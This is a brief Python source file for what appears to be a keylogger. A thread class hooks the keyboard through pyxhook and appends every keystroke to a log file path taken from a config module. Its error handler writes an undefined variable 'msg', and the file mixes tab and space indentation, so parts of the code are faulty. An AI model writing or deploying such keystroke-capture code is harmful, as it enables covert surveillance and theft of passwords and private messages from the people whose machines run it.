import threading
import os
import pyxhook
import config as con


class Logger(threading.Thread):
	
	def OnKeyPress(self, event):
	    with open(con.file['log_file'], 'a+') as f:
	    	print(event.Key)
	    	f.write('{}'.format(event.Key))
	
	def run(self):		
		# create a hook manager object
		new_hook = pyxhook.HookManager()
		new_hook.KeyDown = self.OnKeyPress

		# set the hook
		new_hook.HookKeyboard()
		
		try:
		    new_hook.start()         # start the hook

		except Exception as ex:
		    with open(con.file['error_file'], 'a') as f:
		        f.write('\n{}'.format(msg))

